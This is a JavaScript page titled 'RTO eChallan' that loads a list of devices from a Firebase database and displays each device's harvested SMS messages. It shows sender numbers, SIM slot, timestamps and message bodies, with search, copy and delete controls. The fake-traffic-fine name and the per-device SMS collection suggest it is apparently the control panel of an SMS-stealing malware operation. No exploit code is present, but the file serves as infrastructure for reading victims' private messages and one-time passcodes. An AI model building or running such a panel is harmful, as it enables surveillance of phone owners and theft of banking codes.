// ==========================================
// MESSAGES PAGE - RTO eChallan
// ==========================================
requireAuth();

let allDevices = [];
let currentMessages = [];
let currentFilter = "all";
let currentDeviceId = "";

// ==========================================
// LOAD DEVICE LIST FOR DROPDOWN
// ==========================================
db.ref("device_info").on("value", (snap) => {
  const data = snap.val() || {};
  allDevices = Object.keys(data).map((id) => ({
    id: id,
    serial: data[id].serial_number || 0,
    name: "Device " + (data[id].serial_number || id.slice(-4))
  }));
  allDevices.sort((a, b) => (b.serial || 0) - (a.serial || 0));

  const sel = document.getElementById("deviceSelect");
  const oldVal = sel.value;

  sel.innerHTML = '<option value="">-- Select Device --</option>' +
    allDevices.map((d) => `<option value="${d.id}">${d.name}</option>`).join("");

  if (oldVal && allDevices.find((d) => d.id === oldVal)) {
    sel.value = oldVal;
    loadMessages(oldVal);
  }
});

// ==========================================
// ON DEVICE CHANGE
// ==========================================
function onDeviceChange() {
  const id = document.getElementById("deviceSelect").value;
  if (!id) {
    currentMessages = [];
    currentDeviceId = "";
    renderMessages();
    return;
  }
  loadMessages(id);
}

// ==========================================
// LOAD MESSAGES (from device_info/{id}/messages)
// ==========================================
function loadMessages(deviceId) {
  currentDeviceId = deviceId;
  document.getElementById("messageList").innerHTML =
    '<div class="loading">Loading messages</div>';

  db.ref("device_info/" + deviceId + "/messages").on("value", (snap) => {
    const data = snap.val() || {};
    currentMessages = Object.keys(data).map((k) => ({
      key: k,
      ...data[k]
    }));

    currentMessages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    renderMessages();
  });
}

// ==========================================
// FILTER TABS
// ==========================================
function setFilter(filter, btn) {
  currentFilter = filter;
  document.querySelectorAll(".filter-tabs button").forEach((b) => b.classList.remove("active"));
  btn.classList.add("active");
  filterMessages();
}

function filterMessages() {
  renderMessages();
}

// ==========================================
// RENDER MESSAGES
// ==========================================
function renderMessages() {
  const search = (document.getElementById("searchInput").value || "").toLowerCase().trim();
  const listEl = document.getElementById("messageList");

  let msgs = currentMessages.slice();

  if (currentFilter === "sent") {
    msgs = msgs.filter((m) => (m.type || "").toUpperCase() === "SENT");
  } else if (currentFilter === "incoming") {
    msgs = msgs.filter((m) => (m.type || "").toUpperCase() === "INCOMING");
  }

  if (search) {
    msgs = msgs.filter((m) =>
      String(m.body || m.message || "").toLowerCase().includes(search) ||
      String(m.sender || m.number || m.from || "").toLowerCase().includes(search)
    );
  }

  document.getElementById("msgCount").textContent = msgs.length + " messages";

  if (msgs.length === 0) {
    listEl.innerHTML = '<div class="empty-state">No messages found</div>';
    return;
  }

  listEl.innerHTML = msgs.map((m) => {
    const isSent = (m.type || "").toUpperCase() === "SENT";
    const fromTo = m.sender || m.number || m.receiver || m.from || "-";
    const body = m.body || m.message || "-";
    const sim = m.receivedOn ? " · " + m.receivedOn : (m.sim_slot ? " · SIM " + m.sim_slot : "");
    const timeStr = m.date || formatTime(m.timestamp);
    const bodyEscaped = escapeHtml(body).replace(/"/g, "&quot;");

    return `
      <div class="msg-item ${isSent ? 'sent' : ''}">
        <div class="msg-header">
          <span class="msg-from">
            <span class="msg-tag ${isSent ? 'tag-out' : 'tag-in'}">${isSent ? 'SENT' : 'RECV'}</span>
            ${escapeHtml(fromTo)}${escapeHtml(sim)}
          </span>
          <span class="msg-time">${escapeHtml(timeStr)}</span>
        </div>
        <div class="msg-body">${escapeHtml(body)}</div>
        <div class="msg-actions">
          <button class="msg-action-btn copy-btn" data-msg="${bodyEscaped}" onclick="copyMsg(this)">
            📋 Copy
          </button>
          <button class="msg-action-btn delete-btn" onclick="deleteMsg('${m.key}')">
            🗑️ Delete
          </button>
        </div>
      </div>
    `;
  }).join("");
}

// ==========================================
// COPY MESSAGE
// ==========================================
function copyMsg(btn) {
  const text = btn.getAttribute("data-msg") || "";
  if (navigator.clipboard) {
    navigator.clipboard.writeText(text).then(() => {
      const orig = btn.innerHTML;
      btn.innerHTML = "✅ Copied";
      btn.style.color = "#00ff88";
      setTimeout(() => { btn.innerHTML = orig; btn.style.color = ""; }, 1500);
    }).catch(() => fallbackCopy(text, btn));
  } else {
    fallbackCopy(text, btn);
  }
}

function fallbackCopy(text, btn) {
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.position = "fixed";
  ta.style.opacity = "0";
  document.body.appendChild(ta);
  ta.select();
  try {
    document.execCommand("copy");
    const orig = btn.innerHTML;
    btn.innerHTML = "✅ Copied";
    btn.style.color = "#00ff88";
    setTimeout(() => { btn.innerHTML = orig; btn.style.color = ""; }, 1500);
  } catch (e) { alert("Copy failed"); }
  document.body.removeChild(ta);
}

// ==========================================
// DELETE MESSAGE
// ==========================================
function deleteMsg(msgKey) {
  if (!confirm("Delete this message?")) return;
  if (!currentDeviceId) return;

  db.ref("device_info/" + currentDeviceId + "/messages/" + msgKey).remove()
    .then(() => { console.log("Deleted:", msgKey); })
    .catch((err) => alert("Error: " + err.message));
}
